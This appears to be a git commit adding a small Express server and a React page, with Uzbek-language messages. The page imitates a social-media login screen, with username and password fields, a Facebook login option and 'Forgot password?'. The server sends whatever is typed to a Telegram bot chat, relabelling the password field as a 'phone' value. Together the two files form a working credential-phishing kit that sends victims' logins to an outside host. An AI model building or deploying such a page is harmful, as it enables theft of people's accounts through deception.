94f04d3f5f3a4437e282cf80d246dfd9cb9ef727
Samany <khamidovsamandar5@gmail.com>
2026-08-06 03:35:23 +0500

    birinchi push

---
+++ server/index.js
@@ -0,0 +1,44 @@
+const express = require("express");
+const cors = require("cors");
+const axios = require("axios");
+require("dotenv").config();
+
+const app = express();
+
+app.use(cors());
+app.use(express.json());
+
+app.post("/api/test", async (req, res) => {
+    try {
+        const { name, phone } = req.body;
+
+        const text = `
+📩 Yangi so'rov
+
+👤 Ism: ${name}
+📞 Telefon: ${phone}
+`;
+
+        await axios.post(
+            `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
+            {
+                chat_id: process.env.CHAT_ID,
+                text: text,
+            }
+        );
+
+        res.json({
+            message: "Telegramga yuborildi!",
+        });
+    } catch (error) {
+        console.log(error.response?.data || error.message);
+
+        res.status(500).json({
+            message: "Xatolik yuz berdi",
+        });
+    }
+});
+
+app.listen(5000, () => {
+    console.log("Server ishlayapti: http://localhost:5000");
+});
---
+++ src/App.jsx
@@ -0,0 +1,94 @@
+import { useState } from "react";
+import "./App.scss"
+import { IoLogoFacebook } from "react-icons/io";
+import Logo from "./assets/logo.png"
+
+
+function App() {
+    const [name, setName] = useState("");
+    const [phone, setPhone] = useState("");
+    const [success, setSuccess] = useState("");
+
+    const sendData = async (e) => {
+        e.preventDefault();
+
+        const response = await fetch("http://localhost:5000/api/test", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                name,
+                phone,
+            }),
+        });
+
+        const data = await response.json();
+
+        // alert(data.message);
+
+        setSuccess(" Ma'lumot muvaffaqiyatli yuborildi!")
+        setName("");
+        setPhone("");
+    };
+
+    return (
+        <div className="container">
+            <div className="Logo">
+                <img src={Logo} alt="" />
+            </div>
+
+            <form onSubmit={sendData} className="form">
+
+
+                <div className="inptdiv">
+                    <input
+                        type="text"
+                        placeholder="Phone number, email or username"
+                        value={name}
+                        onChange={(e) => setName(e.target.value)}
+                        className="input1"
+                    />
+
+                    {/* <br />
+                <br /> */}
+
+                    <input
+                        type="text"
+                        placeholder="Password"
+                        value={phone}
+                        onChange={(e) => setPhone(e.target.value)}
+                        className="input2"
+                    />
+                </div>
+                {/* 
+                <br />
+                <br /> */}
+
+                <div className="frgtp">
+                    <p>Forgot password?</p>
+                </div>
+
+                <button type="submit" className="submit">
+                    Log in
+                </button>
+
+                <div className="or">
+                    <hr />
+                    <p>OR</p>
+                    <hr />
+                </div>
+
+                <div className="wthfacebook">
+                    <p><IoLogoFacebook className="fbicon" /> Log in with Facebook</p>
+                </div>
+            </form>
+
+            <div className="bottom">
+                <p>Don't have account? <a href="">Sign up</a></p>
+            </div>
+        </div>
+    );
+}
+
+export default App;
